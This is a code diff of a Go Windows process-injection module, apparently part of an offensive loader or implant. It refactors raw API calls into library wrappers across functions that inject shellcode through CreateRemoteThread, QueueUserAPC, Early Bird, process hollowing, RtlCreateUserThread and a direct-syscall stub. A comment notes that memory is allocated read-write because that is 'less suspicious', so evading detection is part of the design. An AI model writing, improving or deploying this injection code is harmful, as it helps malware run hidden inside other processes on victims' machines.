@@ -187,15 +187,14 @@ func (w *windowsInjector) injectCreateRemoteThread(shellcode []byte) error {
 		return fmt.Errorf("VirtualAllocEx failed: %w", err)
 	}
 
-	var bytesWritten uintptr
-	ret, _, err := api.ProcWriteProcessMemory.Call(
-		uintptr(hProcess),
+	err = windows.WriteProcessMemory(
+		hProcess,
 		addr,
-		uintptr(unsafe.Pointer(&shellcode[0])),
+		&shellcode[0],
 		uintptr(len(shellcode)),
-		uintptr(unsafe.Pointer(&bytesWritten)),
+		nil,
 	)
-	if ret == 0 {
+	if err != nil {
 		return fmt.Errorf("WriteProcessMemory failed: %w", err)
 	}
 
@@ -227,13 +226,13 @@ func (w *windowsInjector) injectCreateThread(shellcode []byte) error {
 	}
 
 	// 2. Allocate with PAGE_READWRITE (less suspicious)
-	addr, _, err := api.ProcVirtualAlloc.Call(
+	addr, err := windows.VirtualAlloc(
 		0,
 		uintptr(len(encoded)),
 		windows.MEM_COMMIT|windows.MEM_RESERVE,
 		windows.PAGE_READWRITE,
 	)
-	if addr == 0 {
+	if err != nil {
 		return fmt.Errorf("VirtualAlloc failed: %w", err)
 	}
 
@@ -252,13 +251,13 @@ func (w *windowsInjector) injectCreateThread(shellcode []byte) error {
 
 	// 6. Change permissions to PAGE_EXECUTE_READ
 	var oldProtect uint32
-	ret, _, err := api.ProcVirtualProtect.Call(
+	err = windows.VirtualProtect(
 		addr,
 		uintptr(len(encoded)),
 		windows.PAGE_EXECUTE_READ,
-		uintptr(unsafe.Pointer(&oldProtect)),
+		&oldProtect,
 	)
-	if ret == 0 {
+	if err != nil {
 		return fmt.Errorf("VirtualProtect failed: %w", err)
 	}
 
@@ -319,15 +318,14 @@ func (w *windowsInjector) injectQueueUserAPC(shellcode []byte) error {
 		return fmt.Errorf("VirtualAllocEx failed: %w", err)
 	}
 
-	var bytesWritten uintptr
-	ret, _, err := api.ProcWriteProcessMemory.Call(
-		uintptr(hProcess),
+	err = windows.WriteProcessMemory(
+		windows.Handle(hProcess),
 		addr,
-		uintptr(unsafe.Pointer(&shellcode[0])),
+		&shellcode[0],
 		uintptr(len(shellcode)),
-		uintptr(unsafe.Pointer(&bytesWritten)),
+		nil,
 	)
-	if ret == 0 {
+	if err != nil {
 		return fmt.Errorf("WriteProcessMemory failed: %w", err)
 	}
 
@@ -355,7 +353,7 @@ func (w *windowsInjector) injectQueueUserAPC(shellcode []byte) error {
 
 		apcRet, _, _ := api.ProcQueueUserAPC.Call(addr, uintptr(hThread), 0)
 
-		api.ProcResumeThread.Call(uintptr(hThread))
+		windows.ResumeThread(hThread)
 
 		windows.CloseHandle(hThread)
 
@@ -416,15 +414,14 @@ func (w *windowsInjector) injectEarlyBird(shellcode []byte) error {
 		return fmt.Errorf("VirtualAllocEx failed: %w", err)
 	}
 
-	var bytesWritten uintptr
-	ret, _, err := api.ProcWriteProcessMemory.Call(
-		uintptr(pi.Process),
+	err = windows.WriteProcessMemory(
+		pi.Process,
 		addr,
-		uintptr(unsafe.Pointer(&shellcode[0])),
+		&shellcode[0],
 		uintptr(len(shellcode)),
-		uintptr(unsafe.Pointer(&bytesWritten)),
+		nil,
 	)
-	if ret == 0 {
+	if err != nil {
 		windows.TerminateProcess(pi.Process, 1)
 		return fmt.Errorf("WriteProcessMemory failed: %w", err)
 	}
@@ -492,15 +489,14 @@ func (w *windowsInjector) injectProcessHollowing(shellcode []byte) error {
 		return fmt.Errorf("VirtualAllocEx failed: %w", err)
 	}
 
-	var bytesWritten uintptr
-	ret, _, err := api.ProcWriteProcessMemory.Call(
-		uintptr(pi.Process),
+	err = windows.WriteProcessMemory(
+		pi.Process,
 		addr,
-		uintptr(unsafe.Pointer(&shellcode[0])),
+		&shellcode[0],
 		uintptr(len(shellcode)),
-		uintptr(unsafe.Pointer(&bytesWritten)),
+		nil,
 	)
-	if ret == 0 {
+	if err != nil {
 		windows.TerminateProcess(pi.Process, 1)
 		return fmt.Errorf("WriteProcessMemory failed: %w", err)
 	}
@@ -561,15 +557,14 @@ func (w *windowsInjector) injectRtlCreateUserThread(shellcode []byte) error {
 		return fmt.Errorf("VirtualAllocEx failed: %w", err)
 	}
 
-	var bytesWritten uintptr
-	ret, _, err := api.ProcWriteProcessMemory.Call(
-		uintptr(hProcess),
+	err = windows.WriteProcessMemory(
+		windows.Handle(hProcess),
 		addr,
-		uintptr(unsafe.Pointer(&shellcode[0])),
+		&shellcode[0],
 		uintptr(len(shellcode)),
-		uintptr(unsafe.Pointer(&bytesWritten)),
+		nil,
 	)
-	if ret == 0 {
+	if err != nil {
 		return fmt.Errorf("WriteProcessMemory failed: %w", err)
 	}
 
@@ -623,16 +618,16 @@ func doSyscall(syscallNum uint16, args ...uintptr) (uintptr, error) {
 		0xC3, // ret
 	}
 
-	stubAddr, _, err := api.ProcVirtualAlloc.Call(
+	stubAddr, err := windows.VirtualAlloc(
 		0,
 		uintptr(len(stub)),
 		windows.MEM_COMMIT|windows.MEM_RESERVE,
 		windows.PAGE_EXECUTE_READWRITE,
 	)
-	if stubAddr == 0 {
+	if err != nil {
 		return 0, fmt.Errorf("failed to allocate syscall stub: %w", err)
 	}
-	defer api.ProcVirtualFree.Call(stubAddr, 0, windows.MEM_RELEASE)
+	defer windows.VirtualFree(stubAddr, 0, windows.MEM_RELEASE)
 
 	ret, _, err := api.ProcRtlMoveMemory.Call(stubAddr, uintptr(unsafe.Pointer(&stub[0])), uintptr(len(stub)))
 	if ret == 0 {
@@ -879,35 +874,35 @@ func findAllThreads(pid int) ([]uint32, error) {
 
 func allocateAndWriteMemoryLocal(shellcode []byte) (uintptr, error) {
 	// 1. Allocate with PAGE_READWRITE
-	addr, _, err := api.ProcVirtualAlloc.Call(
+	addr, err := windows.VirtualAlloc(
 		0,
 		uintptr(len(shellcode)),
 		windows.MEM_COMMIT|windows.MEM_RESERVE,
 		windows.PAGE_READWRITE,
 	)
-	if addr == 0 {
+	if err != nil {
 		return 0, fmt.Errorf("VirtualAlloc failed: %w", err)
 	}
 
 	// 2. Copy shellcode
-	ret, _, err := api.ProcRtlMoveMemory.Call(
+	ret, _, err2 := api.ProcRtlMoveMemory.Call(
 		addr,
 		uintptr(unsafe.Pointer(&shellcode[0])),
 		uintptr(len(shellcode)),
 	)
 	if ret == 0 {
-		return 0, fmt.Errorf("RtlMoveMemory failed: %w", err)
+		return 0, fmt.Errorf("RtlMoveMemory failed: %w", err2)
 	}
 
 	// 3. Change permissions to PAGE_EXECUTE_READ
 	var oldProtect uint32
-	ret, _, err = api.ProcVirtualProtect.Call(
+	err = windows.VirtualProtect(
 		addr,
 		uintptr(len(shellcode)),
 		windows.PAGE_EXECUTE_READ,
-		uintptr(unsafe.Pointer(&oldProtect)),
+		&oldProtect,
 	)
-	if ret == 0 {
+	if err != nil {
 		return 0, fmt.Errorf("VirtualProtect failed: %w", err)
 	}
 
@@ -928,28 +923,27 @@ func allocateAndWriteMemoryRemote(hProcess windows.Handle, shellcode []byte) (ui
 	}
 
 	// 2. Write shellcode
-	var bytesWritten uintptr
-	ret, _, err := api.ProcWriteProcessMemory.Call(
-		uintptr(hProcess),
+	err = windows.WriteProcessMemory(
+		hProcess,
 		addr,
-		uintptr(unsafe.Pointer(&shellcode[0])),
+		&shellcode[0],
 		uintptr(len(shellcode)),
-		uintptr(unsafe.Pointer(&bytesWritten)),
+		nil,
 	)
-	if ret == 0 {
+	if err != nil {
 		return 0, fmt.Errorf("WriteProcessMemory failed: %w", err)
 	}
 
 	// 3. Change permissions to PAGE_EXECUTE_READ
 	var oldProtect uint32
-	ret, _, err = api.ProcVirtualProtectEx.Call(
-		uintptr(hProcess),
+	err = windows.VirtualProtectEx(
+		hProcess,
 		addr,
 		uintptr(len(shellcode)),
 		windows.PAGE_EXECUTE_READ,
-		uintptr(unsafe.Pointer(&oldProtect)),
+		&oldProtect,
 	)
-	if ret == 0 {
+	if err != nil {
 		return 0, fmt.Errorf("VirtualProtectEx failed: %w", err)
 	}
 
